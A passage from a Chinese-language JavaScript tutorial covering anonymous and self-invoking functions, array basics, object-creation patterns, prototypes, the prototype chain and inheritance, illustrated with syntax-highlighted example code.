    <span>let</span> <span>funcObj</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
        <span>alert</span><span>(</span><span>"我是在函数表达式中使用的匿名函数"</span><span>)</span><span>;</span>
    <span>}</span><span>;</span>
    <span>funcObj</span><span>(</span><span>)</span><span>;</span>

    <span>// 2. 对象属性</span>
    <span>let</span> Obj <span>=</span> <span>{</span>
        <span>name</span> <span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
            <span>alert</span><span>(</span><span>"我是在对象属性中使用的匿名函数"</span><span>)</span>
        <span>}</span>
    <span>}</span>
    Obj<span>.</span><span>name</span><span>(</span><span>)</span><span>;</span>

    <span>// 3. 事件</span>
    <span>let</span> btn1 <span>=</span> document<span>.</span><span>getElementById</span><span>(</span><span>"btn1"</span><span>)</span><span>;</span>
    btn1<span>.</span><span>onclick</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
        <span>alert</span><span>(</span><span>"我是在事件中使用的匿名函数"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>// 4.1 事件参数</span>
    <span>setInterval</span><span>(</span><span>function</span><span>(</span><span>)</span> <span>{</span>
        <span>alert</span><span>(</span><span>"我是在事件参数中使用的匿名函数"</span><span>)</span><span>;</span>
    <span>}</span><span>,</span> <span>10000</span><span>)</span><span>;</span>
    
    <span>// 4.2 事件监听参数</span>
    <span>// 1. 基于IE内核浏览器</span>
    <span>let</span> btn2 <span>=</span> document<span>.</span><span>getElementById</span><span>(</span><span>"btn2"</span><span>)</span><span>;</span>
    btn2<span>.</span><span>attachEvent</span><span>(</span>onclick<span>,</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
        <span>alert</span><span>(</span><span>"我是在事件监听中使用的匿名函数"</span><span>)</span><span>;</span>
    <span>}</span><span>,</span> <span>false</span><span>)</span><span>;</span>

    <span>// 2.  基于W3C内核的事件监听</span>
    <span>let</span> btn3 <span>=</span> document<span>.</span><span>getElementById</span><span>(</span><span>"btn3"</span><span>)</span><span>;</span>
    btn3<span>.</span><span>addEventListener</span><span>(</span>onclick<span>,</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
        <span>alert</span><span>(</span><span>"我是在事件监听中使用的匿名函数"</span><span>)</span><span>;</span>
    <span>}</span><span>,</span> <span>false</span><span>)</span><span>;</span>
    

    <span>// 5. 返回值</span>
    <span>function</span> <span>test</span><span>(</span><span>)</span><span>{</span>
        <span>return</span> <span>function</span><span>(</span><span>)</span><span>{</span>
            <span>return</span> <span>"哈哈"</span><span>;</span>
        <span>}</span>
    <span>}</span>
    console<span>.</span><span>log</span><span>(</span><span>test</span><span>(</span><span>)</span><span>(</span><span>)</span><span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br></div></div><p><strong>匿名自执行函数</strong></p>
<ul>
<li>概念：匿名函数的定义完成后立即执行，执行函数表达式</li>
<li>作用：实现闭包和创建独立的命名空间</li>
<li>使用：分组操作符()，void操作符，~操作符，!操作符等等</li>
</ul>
<div><pre><code><span>// 1. 分组操作符</span>
<span>// 1.1 第一种：()在外面</span>
<span>(</span><span>function</span> <span>funcObj1</span><span>(</span><span>)</span><span>{</span>
    <span>alert</span><span>(</span><span>"我是由分组操作符使用匿名自执行函数1"</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>(</span><span>)</span><span>;</span>

<span>// 1.2 第二种：()在里面</span>
<span>(</span><span>function</span> <span>funcObj2</span><span>(</span><span>)</span><span>{</span>
    <span>alert</span><span>(</span><span>"我是()操作符"</span><span>)</span><span>;</span>
<span>}</span><span>(</span><span>)</span><span>)</span><span>;</span>


<span>// 2. void操作符</span>
<span>void</span> <span>function</span> <span>funcObj3</span><span>(</span><span>)</span><span>{</span>
    <span>alert</span><span>(</span><span>"我是void操作符"</span><span>)</span>
<span>}</span><span>(</span><span>)</span><span>;</span>

<span>// 3. ~操作符</span>
<span>~</span><span>function</span> <span>funcObj4</span><span>(</span><span>)</span><span>{</span>
    <span>alert</span><span>(</span><span>"我是~操作符"</span><span>)</span><span>;</span>
<span>}</span><span>(</span><span>)</span><span>;</span>

<span>// 4. !操作符</span>
<span>!</span><span>function</span> <span>funcObj5</span><span>(</span><span>)</span><span>{</span>
    <span>alert</span><span>(</span><span>"我是!操作符"</span><span>)</span><span>;</span>
<span>}</span><span>(</span><span>)</span><span>;</span>

<span>//函数表达式</span>
<span>var</span> <span>funcObj6</span> <span>=</span> <span>function</span><span>(</span><span>)</span><span>{</span>
    <span>alert</span><span>(</span><span>"我是函数表达式"</span><span>)</span><span>;</span>
<span>}</span><span>(</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br></div></div><h3 id="系统函数-内置函数" tabindex="-1"> 系统函数(内置函数)</h3>
<h4 id="常规函数" tabindex="-1"> 常规函数</h4>
<p><img src="@source/assets/cs-note/preface/basic/regular--function.png" alt="" loading="lazy"></p>
<h4 id="数组函数" tabindex="-1"> 数组函数</h4>
<p><img src="@source/assets/cs-note/preface/basic/array-function.png" alt="" loading="lazy"></p>
<p><strong>数组常用操作</strong></p>
<ul>
<li>数组声明
<ul>
<li>var arr=new Array();//声明一个空数组对象</li>
<li>var arr=new Array(length)//声明一个指定长度的数组</li>
<li>var arr=[元素]//声明数组(最常用);js中的数组声明不用指定长度，js的数组长度是不固定的，会随着元素的数量改变而改变。</li>
</ul>
</li>
<li>数组的赋值和取值
<ul>
<li>数组可以存储任意类型的数据：数组名[角标]=值;//角标可以是任意的正整数或者是0</li>
<li>数组的取出：数组名[角标]//返回当前角标对应存储的值；如果角标不存在，返回undefined;</li>
</ul>
</li>
<li>数组特点
<ul>
<li>js中的数组可以存储任意类型的数据。</li>
<li>js的数组可以通过length属性动态的改变长度。可以增加，也可以缩短。</li>
<li>注意：
<ul>
<li>如果是增加，则使用逗号进行占位</li>
<li>如果是缩减则从后往前减少存储的数据。</li>
</ul>
</li>
</ul>
</li>
<li>数组的length属性
<ul>
<li>作用1：数组名.length          //返回当前数组的长度。</li>
<li>作用2：数组名.length=新的值   //动态的改变数组的长度</li>
<li>注意：length&gt;原有长度，则使用空进行填充。length&lt;原有长度，则从后面进行截取，最后的数据会被删除。</li>
</ul>
</li>
<li>数组的遍历
<ul>
<li>普通for循环： for(var i=0;i &lt; arr.length; i++)</li>
<li>for-in: for(var i in arr)</li>
</ul>
</li>
</ul>
<h4 id="日期函数" tabindex="-1"> 日期函数</h4>
<p><img src="@source/assets/cs-note/preface/basic/date-function.png" alt="" loading="lazy"></p>
<h4 id="数学函数" tabindex="-1"> 数学函数</h4>
<p><img src="@source/assets/cs-note/preface/basic/math-function.png" alt="" loading="lazy"></p>
<h4 id="字符串函数" tabindex="-1"> 字符串函数</h4>
<p><img src="@source/assets/cs-note/preface/basic/string-function.png" alt="" loading="lazy"></p>
<h2 id="面向对象" tabindex="-1"> 面向对象</h2>
<p>js是基于<strong>原型</strong>，基于面向对象编程也即<strong>OOP</strong>(Object Oriented Programming)，它没有类的概念，而是直接使用<strong>对象</strong>来编程</p>
<h3 id="创建对象" tabindex="-1"> 创建对象</h3>
<ol>
<li>
<p>创建Object实例和对象字面量</p>
<ul>
<li>缺点：重复实例化对象时代码冗余高</li>
</ul>
</li>
<li>
<p>工厂模式</p>
<ul>
<li>优点：解决重复实例化对象的问题</li>
<li>缺点：无法识别对象的类型，因为所有的实例指向一个原型(Object)</li>
</ul>
</li>
<li>
<p>构造函数模式</p>
<ul>
<li>优点：实例可以识别为一个特定的类型，解决工厂模式的缺点</li>
<li>缺点：多个实例重复创建方法，无法共享</li>
</ul>
</li>
<li>
<p>原型模式</p>
<ul>
<li>优点：方法不会被重复创建，解决了构造函数模式的缺点</li>
<li>缺点：所有实例共享它的属性和方法，不能传参和初始化属性值</li>
</ul>
</li>
<li>
<p>混合模式(3+4)推荐</p>
<ul>
<li>优点：构造函数共享实例属性，原型共享方法和想要共享的属性，可传递参数，初始化属性值</li>
<li>缺点：基本没有</li>
</ul>
</li>
</ol>
<div><pre><code>window<span>.</span><span>onload</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>// 1. 创建Object实例</span>
    <span>let</span> Person <span>=</span> <span>new</span> <span>Object</span><span>(</span><span>)</span><span>;</span>
    Person<span>.</span>name <span>=</span> <span>"张三"</span><span>;</span>
    Person<span>.</span>age <span>=</span> <span>"18"</span><span>;</span>
    Person<span>.</span><span>showInfo</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
        console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>"今年"</span> <span>+</span> <span>this</span><span>.</span>age <span>+</span> <span>"了"</span><span>)</span><span>;</span>
    <span>}</span>
    Person<span>.</span><span>showInfo</span><span>(</span><span>)</span><span>;</span>

    <span>// 2. 对象字面量</span>
    <span>let</span> Student <span>=</span> <span>{</span>
        <span>name</span> <span>:</span> <span>"张三"</span><span>,</span>
        <span>age</span> <span>:</span> <span>"18"</span><span>,</span>
        <span>showInfo</span> <span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>"今年"</span> <span>+</span> <span>this</span><span>.</span>age <span>+</span> <span>"了"</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span><span>;</span>
    Student<span>.</span><span>showInfo</span><span>(</span><span>)</span><span>;</span>


    <span>// 3. 工厂模式</span>
    <span>function</span> <span>createObjFactory</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
        <span>const</span> obj <span>=</span> <span>new</span> <span>Object</span><span>(</span><span>)</span><span>;</span>
        obj<span>.</span>name <span>=</span> name<span>;</span>
        obj<span>.</span>age <span>=</span> age<span>;</span>
        obj<span>.</span><span>showInfo</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>"今年"</span> <span>+</span> <span>this</span><span>.</span>age <span>+</span> <span>"了"</span><span>)</span><span>;</span>
        <span>}</span>
        <span>return</span> obj<span>;</span>
    <span>}</span>
    <span>let</span> obj <span>=</span> <span>createObjFactory</span><span>(</span><span>"张三"</span><span>,</span> <span>17</span><span>)</span><span>;</span>
    obj<span>.</span><span>showInfo</span><span>(</span><span>)</span><span>;</span>
    <span>// 缺点验证</span>
    console<span>.</span><span>log</span><span>(</span>obj <span>instanceof</span> <span>Object</span><span>)</span><span>;</span> <span>// true</span>
    console<span>.</span><span>log</span><span>(</span>obj <span>instanceof</span> <span>createObjFactory</span><span>)</span><span>;</span> <span>// false</span>


    <span>// 4. 构造函数模式</span>
    <span>function</span> <span>Teacher</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
        <span>this</span><span>.</span>age <span>=</span> age<span>;</span>
        <span>this</span><span>.</span><span>showInfo</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>"今年"</span> <span>+</span> <span>this</span><span>.</span>age <span>+</span> <span>"了"</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
    <span>let</span> tea1 <span>=</span> <span>new</span> <span>Teacher</span><span>(</span><span>"张三"</span><span>,</span> <span>28</span><span>)</span><span>;</span>
    <span>let</span> tea2 <span>=</span> <span>new</span> <span>Teacher</span><span>(</span><span>"李四"</span><span>,</span> <span>10</span><span>)</span><span>;</span>
    <span>// 优点验证</span>
    console<span>.</span><span>log</span><span>(</span>tea1 <span>instanceof</span> <span>Object</span><span>)</span><span>;</span> <span>// true</span>
    console<span>.</span><span>log</span><span>(</span>tea1 <span>instanceof</span> <span>Teacher</span><span>)</span><span>;</span> <span>// true</span>
    <span>// 缺点验证</span>
    console<span>.</span><span>log</span><span>(</span>tea1<span>.</span>showInfo <span>==</span> tea2<span>.</span>showInfo<span>)</span><span>;</span> <span>// false</span>
    

    <span>// 5. 原型模式</span>
    <span>function</span> <span>Worker</span><span>(</span><span>)</span> <span>{</span>
    <span>}</span>
    <span>Worker</span><span>.</span>prototype <span>=</span> <span>{</span>
        <span>constructor</span> <span>:</span> Worker<span>,</span>
        <span>name</span> <span>:</span> <span>"张三"</span><span>,</span>
        <span>age</span> <span>:</span> <span>18</span><span>,</span>
        <span>showInfo</span> <span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>"今年"</span> <span>+</span> <span>this</span><span>.</span>age <span>+</span> <span>"了"</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span><span>;</span>
    <span>let</span> wor1 <span>=</span> <span>new</span> <span>Worker</span><span>(</span><span>)</span><span>;</span>
    <span>let</span> wor2 <span>=</span> <span>new</span> <span>Worker</span><span>(</span><span>)</span><span>;</span>
    <span>// 优点验证</span>
    console<span>.</span><span>log</span><span>(</span>wor1<span>.</span>showInfo <span>==</span> wor2<span>.</span>showInfo<span>)</span><span>;</span> <span>// true</span>
    <span>// 缺点验证</span>
    console<span>.</span><span>log</span><span>(</span>wor1<span>.</span>name <span>==</span> wor2<span>.</span>name<span>)</span><span>;</span> <span>// true</span>
   
    
    <span>// 6. 混合模式(构造函数模式和原型模式)</span>
    <span>function</span> <span>People</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
        <span>this</span><span>.</span>age <span>=</span> age<span>;</span>
    <span>}</span>
    <span>People</span><span>.</span>prototype <span>=</span> <span>{</span>
        <span>constructor</span> <span>:</span> People<span>,</span>
        <span>showInfo</span> <span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>"今年"</span> <span>+</span> <span>this</span><span>.</span>age <span>+</span> <span>"了"</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span><span>;</span>
    <span>let</span> p <span>=</span> <span>new</span> <span>People</span><span>(</span><span>"王五"</span><span>,</span> <span>50</span><span>)</span><span>;</span>
    <span>let</span> p2 <span>=</span> <span>new</span> <span>People</span><span>(</span><span>"李四"</span><span>,</span> <span>20</span><span>)</span><span>;</span>
    <span>// 优点验证</span>
    console<span>.</span><span>log</span><span>(</span>p<span>.</span>showInfo <span>==</span> p2<span>.</span>showInfo<span>)</span><span>;</span> <span>// true</span>
    console<span>.</span><span>log</span><span>(</span>p<span>.</span>name <span>==</span> p2<span>.</span>name<span>)</span><span>;</span> <span>// false</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br></div></div><h3 id="构造函数" tabindex="-1"> 构造函数</h3>
<p>通过  new 函数名来实例化对象的函数叫构造函数。任何的函数都可以作为构造函数存在。之所以有构造函数与普通函数之分，主要从功能上进行区别的，构造函数的主要 功能为 初始化对象，特点是和new 一起使用。new就是在创建对象，从无到有，构造函数就是在为初始化的对象添加属性和方法。构造函数定义时首字母大写（规范）。</p>
<p><strong>常用的构造函数</strong></p>
<ol>
<li>var arr = [];    为      var arr = new Array();      的语法糖</li>
<li>var obj = {}     为      var obj = new Object();     的语法糖</li>
<li>var  date = new Date();</li>
<li>...</li>
</ol>
<h3 id="原型和原型链" tabindex="-1"> 原型和原型链</h3>
<p><strong>原型对象</strong></p>
<ol>
<li>函数对象都具有prototype属性，它指向函数的原型对象(浏览器内存创建的对象)，原型对象都具有constructor属性，它指向prototype属性所在的函数对象(构造函数)。</li>
</ol>
<ul>
<li>当调用构造函数创建一个实例后，该实例会有一个隐藏属性__proto__ ([[prototype]] )，它指向构造函数的原型对象。</li>
<li>所有构造函数的prototype都是object类型，而Function的prototype是一个空函数，所有内置函数的_proto_指向这个空函数。</li>
<li>为实例添加一个属性时，这个属性会屏蔽原型对象中的同名属性(不会重写)，若想访问原型对象中的属性值，需要使用delete将这个同名属性在实例中彻底删除</li>
<li>hasOwnProperty(&quot;属性名&quot;)可以检测一个属性是存在于实例还是原型对象中，true表示存在于实例中，false表示存在于原型对象中</li>
<li>in操作符用来判断一个属性是否存在于这个对象中(无论是实例还是原型对象)</li>
<li>当使用对象字面量来重写原型对象时，会改变其constructor属性，使其指向Object构造函数，而不是原有的对</li>
</ul>
<div><pre><code>window<span>.</span><span>onload</span> <span>=</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
    <span>// 函数对象</span>
    <span>function</span> <span>People</span><span>(</span><span>name<span>,</span> age</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
        <span>this</span><span>.</span>age <span>=</span> age<span>;</span>
    <span>}</span>
    <span>People</span><span>.</span>prototype <span>=</span> <span>{</span>
        <span>constructor</span> <span>:</span> People<span>,</span>
        <span>showInfo</span> <span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
            console<span>.</span><span>log</span><span>(</span><span>this</span><span>.</span>name <span>+</span> <span>"今年"</span> <span>+</span> <span>this</span><span>.</span>age <span>+</span> <span>"岁了"</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span><span>;</span>

    <span>let</span> p <span>=</span> <span>new</span> <span>People</span><span>(</span><span>)</span><span>;</span>
    p<span>.</span><span>showInfo</span><span>(</span><span>)</span><span>;</span>

    <span>/**
     * 1. 验证第一条
     */</span>
    <span>// 1.1 构造函数的prototype属性指向原型对象</span>
    console<span>.</span><span>log</span><span>(</span><span>People</span><span>.</span>prototype<span>)</span><span>;</span> <span>// {constructor: ƒ, showInfo: ƒ}</span>

    <span>// 1.2 原型对象的constructor属性指向构造函数</span>
    console<span>.</span><span>log</span><span>(</span><span>People</span><span>.</span>prototype<span>.</span>constructor<span>)</span><span>;</span> <span>// ƒ People()</span>

    <span>/**
     * 2. 验证第二条
     */</span>
    <span>// 构造函数的实例有__proto__属性，他指向构造函数的原型对象</span>
    console<span>.</span><span>log</span><span>(</span>p<span>.</span>__proto__ <span>===</span> <span>People</span><span>.</span>prototype<span>)</span><span>;</span> <span>// true</span>

    <span>/**
     * 3. 验证第三条
     */</span>
    <span>// 3.1 所有构造函数的prototype都是object</span>
    <span>function</span> <span>A</span><span>(</span><span>)</span> <span>{</span>
    <span>}</span>
    console<span>.</span><span>log</span><span>(</span><span>typeof</span> <span>People</span><span>.</span>prototype<span>)</span><span>;</span> <span>// object</span>
    console<span>.</span><span>log</span><span>(</span><span>typeof</span> <span>A</span><span>.</span>prototype<span>)</span><span>;</span> <span>// object</span>
    console<span>.</span><span>log</span><span>(</span><span>People</span><span>.</span>prototype <span>instanceof</span> <span>Object</span><span>)</span><span>;</span> <span>// true</span>
    console<span>.</span><span>log</span><span>(</span><span>A</span><span>.</span>prototype <span>instanceof</span> <span>Object</span><span>)</span><span>;</span> <span>// true</span>

    <span>// 3.2 Function的prototype是个空函数</span>
    console<span>.</span><span>log</span><span>(</span><span>Function</span><span>.</span>prototype<span>)</span><span>;</span> <span>// ƒ ()</span>

    <span>// 3.3 所有内置函数的__proto__属性都指向这个空函数</span>
    console<span>.</span><span>log</span><span>(</span>Array<span>.</span>__proto__<span>)</span><span>;</span> <span>// ƒ ()</span>
    console<span>.</span><span>log</span><span>(</span>Date<span>.</span>__proto__<span>)</span><span>;</span> <span>// ƒ ()</span>
    console<span>.</span><span>log</span><span>(</span>Math<span>.</span>__proto__<span>)</span><span>;</span> <span>// ƒ ()</span>
    console<span>.</span><span>log</span><span>(</span>String<span>.</span>__proto__<span>)</span><span>;</span> <span>// ƒ ()</span>

    <span>/**
     * 4. 验证第四条
     */</span>
    <span>// 1. 为实例添加一个属性时会屏蔽原型对象的同名属性值，因为会先在实例中找，找不到才去原型对象中找</span>
    <span>function</span> <span>Teacher</span><span>(</span><span>name</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
    <span>}</span>
    <span>Teacher</span><span>.</span>prototype<span>.</span>name <span>=</span> <span>"张三"</span><span>;</span>
    <span>let</span> tea <span>=</span> <span>new</span> <span>Teacher</span><span>(</span><span>"李四"</span><span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>tea<span>.</span>name<span>)</span><span>;</span> <span>// 李四</span>
    console<span>.</span><span>log</span><span>(</span>tea<span>.</span>__proto__<span>.</span>name<span>)</span><span>;</span> <span>// 张三</span>

    <span>// 2. 使用delete删除实例的同名属性值</span>
    console<span>.</span><span>log</span><span>(</span>
        <span>delete</span> tea<span>.</span>name
    <span>)</span><span>;</span> <span>// true</span>
    console<span>.</span><span>log</span><span>(</span>tea<span>.</span>name<span>)</span><span>;</span> <span>// 张三</span>

    <span>/**
     * 5. 验证第五条
     */</span>
    <span>// 检测一个属性在实例对象中(true)还是原型对象中(false)</span>
    console<span>.</span><span>log</span><span>(</span>p<span>.</span><span>hasOwnProperty</span><span>(</span>name<span>)</span><span>)</span><span>;</span> <span>// false</span>

    <span>/**
     * 6. 验证第六条
     */</span>
    <span>// 判断实例和原型对象是否有此属性</span>
    console<span>.</span><span>log</span><span>(</span>name <span>in</span> p<span>)</span><span>;</span> <span>// false</span>

    <span>/**
     * 7. 验证第七条
     */</span>
    <span>//当使用对象字面量来重写原型对象时，会改变其constructor属性，使其指向Object构造函数，而不是原有的对象</span>
    <span>function</span> <span>Worker</span><span>(</span><span>name</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
    <span>}</span>
    <span>Worker</span><span>.</span>prototype <span>=</span> <span>{</span>
        <span>// 必须手动指向</span>
        <span>constuctor</span> <span>:</span> Worker<span>,</span>
        <span>showInfo</span> <span>:</span> <span>function</span><span>(</span><span>)</span> <span>{</span>
            <span>alert</span><span>(</span><span>this</span><span>.</span>name<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span><span>;</span>
    <span>// 没有手动指向</span>
    console<span>.</span><span>log</span><span>(</span><span>Worker</span><span>.</span>prototype<span>)</span><span>;</span> <span>// {showInfo: ƒ}</span>
    <span>// 手动指向</span>
    console<span>.</span><span>log</span><span>(</span><span>Worker</span><span>.</span>prototype<span>)</span><span>;</span> <span>// {constuctor: ƒ, showInfo: ƒ}</span>
    
    <span>/**
     * 8. 判断一个对象是否在此对象的原型链中
     */</span>
    console<span>.</span><span>log</span><span>(</span><span>Object</span><span>.</span>prototype<span>.</span><span>isPrototypeOf</span><span>(</span>p<span>)</span><span>)</span><span>;</span> <span>// true </span>
    console<span>.</span><span>log</span><span>(</span><span>People</span><span>.</span>prototype<span>.</span><span>isPrototypeOf</span><span>(</span>p<span>)</span><span>)</span><span>;</span> <span>// true</span>
    
    <span>/**
     * 9. 返回该对象的原型
     */</span>
    console<span>.</span><span>log</span><span>(</span>p<span>.</span>__proto__ <span>===</span> Object<span>.</span><span>getPrototypeOf</span><span>(</span>p<span>)</span><span>)</span><span>;</span> <span>// true</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br></div></div><p><strong>prototype和__proto__的区别</strong></p>
<ul>
<li>prototype属性只有函数对象有，而__proto__属性所有对象都有</li>
<li>prototype是由函数对象指向原型对象，而__proto__属性是由实例指向函数对象的原型对象</li>
</ul>
<p><strong>原型链</strong>：将父类型的实例作为子类型的原型对象，以此构成的链式关系叫做原型链</p>
<p><img src="@source/assets/cs-note/preface/basic/原型链.png" alt="" loading="lazy"></p>
<h3 id="继承" tabindex="-1"> 继承</h3>
<ol>
<li>
<p>原型链继承</p>
<ul>
<li>优点：父类原型定义的属性和方法可以复用</li>
<li>缺点：子类实例没有自己的属性，不能向父类传递参数</li>
</ul>
</li>
<li>
<p>构造函数继承</p>
<ul>
<li>优点：子类实例有自己的属性，可以向父类传递参数，解决原型链继承的缺点</li>
<li>缺点：父类原型的属性和方法不可复用</li>
</ul>
</li>
<li>
<p>组合继承(推荐1)</p>
<ul>
<li>优点：原型的属性和方法可以复用，每个子类实例都有自己的属性。</li>
<li>缺点：父类构造函数调用了两次，子类原型的中的父类实例属性被子类实例覆盖</li>
</ul>
</li>
<li>
<p>寄生组合式继承(推荐2)</p>
<ul>
<li>优点：解决了组合继承的缺点，效率高</li>
<li>缺点：基本没有</li>
</ul>
</li>
<li>
<p>class继承</p>
<ul>
<li>class类中的方法是原型方法不用function声明</li>
<li>子类的__proto__属性指向父类，表示构造函数的继承</li>
<li>子类的原型的__proto__指向父类的原型，表示方法的继承</li>
<li>class类可以继承Object和null</li>
</ul>
</li>
</ol>
<p><strong>ES6 中 class 与构造函数的关系</strong></p>
<p><strong>构造函数</strong>：通过  new 函数名来实例化对象的函数叫构造函数。任何的函数都可以作为构造函数存在。之所以有构造函数与普通函数之分，主要从功能上进行区别的，构造函数的主要功能为初始化对象，特点是和new 一起使用。new就是在创建对象，从无到有，构造函数就是在为初始化的对象添加属性和方法。构造函数定义时首字母大写（规范）。</p>
<p>class 为构造函数的语法糖，即 class 的本质是构造函数。class 的继承 extends  本质为构造函数的原型链的继承。</p>
<div><pre><code>

<span>function</span> <span>test1</span><span>(</span><span>)</span> <span>{</span>
    <span>function</span> <span>SuperType</span><span>(</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>city <span>=</span> <span>[</span><span>"北京"</span><span>,</span> <span>"上海"</span><span>,</span> <span>"天津"</span><span>]</span><span>;</span>
